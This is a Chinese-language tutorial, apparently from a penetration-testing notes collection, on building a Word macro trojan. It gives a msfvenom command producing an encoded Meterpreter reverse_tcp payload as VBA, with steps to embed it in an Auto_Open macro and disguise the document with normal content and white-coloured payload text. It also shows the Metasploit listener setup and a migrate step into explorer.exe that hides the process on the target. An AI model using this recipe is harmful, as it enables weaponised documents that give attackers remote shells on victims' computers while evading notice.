Word 宏病毒是嵌入文档中的恶意代码，利用宏功能传播并执行破坏性操作，如篡改文件或窃取信息。

> 需要安装 Office LTSC 专业增强版 2021

## 1 制作木马文档

生成 payload

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.6.24 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f vba-exe
```

打开 word 的宏

![打开 word 的宏](./../../../../images/Word/%E6%89%93%E5%BC%80%20word%20%E7%9A%84%E5%AE%8F.png)

输入宏病毒的名，创建

```
Auto_Open
```

![](./../../../../images/Word/%E8%BE%93%E5%85%A5%E5%AE%8F%E7%97%85%E6%AF%92%E7%9A%84%E5%90%8D%EF%BC%8C%E5%88%9B%E5%BB%BA.png)

清空代码，写入宏病毒，打开视图

> 粘贴从 Sub Auto_Open() 到 End Sub 的内容

![](./../../../../images/Word/%E6%B8%85%E7%A9%BA%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%86%99%E5%85%A5%E5%AE%8F%E7%97%85%E6%AF%92%EF%BC%8C%E6%89%93%E5%BC%80%E8%A7%86%E5%9B%BE.png)

写入 Payload，保存

> 粘贴***下面的长字符段

![](./../../../../images/Word/%E5%86%99%E5%85%A5%20Payload%EF%BC%8C%E4%BF%9D%E5%AD%98.png)

修饰

> 建议在文档开头加入正常的内容，并将 Payload 代码改成白色

![](./../../../../images/Word/%E4%BF%AE%E9%A5%B0.png)

> 点开文档会运行宏代码，下载木马至某个目录中，并执行木马，反弹 shell

## 2 渗透测试

msf 配置侦听

```
msf6 > use exploit/multi/handler
```

```
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
```

```
msf6 exploit(multi/handler) > set lhost 192.168.6.24
```

```
msf6 exploit(multi/handler) > set lport 4444
```

```
msf6 exploit(multi/handler) > run
```

目标运行文档

![](./../../../../images/Word/%E7%9B%AE%E6%A0%87%E8%BF%90%E8%A1%8C%E6%96%87%E6%A1%A3.png)

> 成功建立连接，目标关闭 word 文档之后 session 不受影响

## 3 进程迁移

> 建议将进程迁移到资源管理器

在目标主机中可看到可疑进程

![](./../../../../images/Word/%E5%9C%A8%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E4%B8%AD%E5%8F%AF%E7%9C%8B%E5%88%B0%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B.png)

获取当前进程 pid

```
meterpreter > getpid
Current pid: 964
```

查看进程列表，根据 pid 找到进程

```
meterpreter > ps
```

![](./../../../../images/Word/%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E5%88%97%E8%A1%A8%EF%BC%8C%E6%A0%B9%E6%8D%AE%20pid%20%E6%89%BE%E5%88%B0%E8%BF%9B%E7%A8%8B.png)

查看资源管理器的进程

```
meterpreter > ps -S explorer.exe
```

![](./../../../../images/Word/%E6%9F%A5%E7%9C%8B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E7%9A%84%E8%BF%9B%E7%A8%8B.png)

将可疑进程隐藏到资源管理器

```
meterpreter > migrate 4508
```

再次查看 pid

```
meterpreter > getpid
Current pid: 4508
```

目标主机中可疑进程迁移到了资源管理器

![](./../../../../images/Word/%E5%9C%A8%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E4%B8%AD%E5%8F%AF%E7%9C%8B%E5%88%B0%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B.png)